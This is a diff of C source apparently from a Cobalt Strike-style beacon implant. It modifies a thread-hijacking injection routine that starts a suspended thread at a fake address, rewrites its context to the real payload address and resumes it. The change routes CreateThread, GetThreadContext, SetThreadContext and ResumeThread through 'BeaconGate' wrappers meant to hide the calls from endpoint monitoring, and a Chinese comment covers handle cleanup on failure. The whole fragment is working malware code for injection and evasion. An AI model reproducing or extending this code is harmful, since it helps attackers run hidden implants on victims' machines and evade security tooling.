@@ -2,6 +2,7 @@
 #include "syscalls.h"
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
@@ -23,7 +24,7 @@ BOOL inject_with_hinted_func(DWORD method, HANDLE hProcess, LPVOID lpStartAddres
 	/* create our thread */
 	switch (method) {
 		case PI_EXEC_CREATETHREAD_F:
-			hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
+			hThread = gate_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
 			break;
 		case PI_EXEC_CREATEREMOTETHREAD_F:
 			hThread = beacon_CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFakeAddr, lpParameter, CREATE_SUSPENDED, NULL);
@@ -36,7 +37,7 @@ BOOL inject_with_hinted_func(DWORD method, HANDLE hProcess, LPVOID lpStartAddres
 
 	/* get our thread context */
 	ctx.ContextFlags = CONTEXT_FULL;
-	if (!GetThreadContext(hThread, &ctx)) {
+	if (!gate_GetThreadContext(hThread, &ctx)) {
 		/* CREATE_SUSPENDED 线程失败路径必须关句柄：否则每次失败泄漏一个
 		   永久挂起的线程（本进程内）+ 一个句柄 */
 		beacon_CloseHandle(hThread);
@@ -50,13 +51,13 @@ BOOL inject_with_hinted_func(DWORD method, HANDLE hProcess, LPVOID lpStartAddres
 	ctx.Eax = (DWORD)lpStartAddress;
 #endif
 
-	if (!SetThreadContext(hThread, &ctx)) {
+	if (!gate_SetThreadContext(hThread, &ctx)) {
 		beacon_CloseHandle(hThread);
 		return FALSE;
 	}
 
 	/* if the thread resumes, we're good, it worked */
-	if (ResumeThread(hThread) == -1) {
+	if (gate_ResumeThread(hThread) == -1) {
 		beacon_CloseHandle(hThread);
 		return FALSE;
 	}
